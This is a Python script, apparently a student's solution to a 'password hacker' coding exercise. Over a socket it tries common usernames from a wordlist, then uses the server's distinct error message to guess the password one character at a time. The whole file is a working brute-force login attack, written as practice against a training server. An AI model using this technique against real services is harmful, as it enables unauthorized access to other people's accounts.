import socket
import argparse
import itertools
import json
import string


def get_common_logins():
    with open("/home/jurikolo/git/hyperskill-python/password-hacker/logins.txt", "r") as f:
        str = [i.replace("\n", "") for i in f.readlines()]
    return str


def get_password_modifications(password):
    list_to_iterate = []
    result = []
    for char in password:
        list_to_iterate.append([char, char.upper()])
    for x in itertools.product(*list_to_iterate):
        password = ""
        for char in x:
            password += char
        result.append(password)
    return result


def hack_login(client_socket):
    common_logins = get_common_logins()
    for i in common_logins:
        login_trial = {"login": i, "password": " "}
        login_trial = json.dumps(login_trial).encode()
        client_socket.send(login_trial)
        response = client_socket.recv(1024).decode()
        response = json.loads(response)
        if response["result"] != "Wrong login!":
            login = i
            break
    return login


def hack_password(client_socket, login):
    global dictionary
    response = json.loads('{"result": "asdf"}')
    password = ""
    while response["result"] != "Connection success!":
        for pw in dictionary:
            trial = json.dumps({"login": login, "password": pw})
            trial = trial.encode()
            client_socket.send(trial)
            response = json.loads(client_socket.recv(1024))
            if response["result"] == "Exception happened during login":
                password += pw
                dictionary = [pw + i[-1] for i in dictionary]
                break
            if response["result"] == "Connection success!":
                password = pw
                break
    return password


parser = argparse.ArgumentParser()
parser.add_argument("hostname")
parser.add_argument("port")
args = parser.parse_args()

hostname = args.hostname
port = int(args.port)

password_is_hacked = False
dictionary = list(string.ascii_lowercase) + list(string.digits)
password = ""

with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)

    login = hack_login(client_socket)
    password = hack_password(client_socket, login)

print(json.dumps({"login": login, "password": password}))
